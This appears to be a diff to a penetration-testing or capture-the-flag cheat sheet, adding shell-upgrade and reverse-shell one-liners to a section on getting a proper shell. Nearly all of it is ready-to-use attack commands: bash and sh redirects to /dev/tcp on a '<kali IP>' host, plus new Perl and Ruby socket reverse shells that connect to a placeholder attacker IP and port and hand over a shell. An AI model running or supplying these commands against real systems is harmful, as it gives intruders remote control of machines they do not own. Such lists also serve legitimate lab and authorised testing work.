@@ -103,8 +103,13 @@ ls /usr/share/applications/
 - If you don't have proper shell then try this command if it having python or bash or sh
 ```bash
 python -c 'import pty; pty.spawn("/bin/bash");'
+python3 -c 'import pty; pty.spawn("/bin/bash");'
+sh -i
+bash -i
 bash -i >& /dev/tcp/<kali IP>/1234 0>&1
 sh -i >& /dev/tcp/<kali IP>/1234 0>&1
+perl -e 'exec "/bin/bash";'
+perl -e 'use Socket;$i="<attacker_ip>";$p=<port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+ruby -e 'exec "/bin/bash"'
+ruby -rsocket -e 'exit if fork;c=TCPSocket.new("<attacker_ip>",<port>);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 ```
-
-
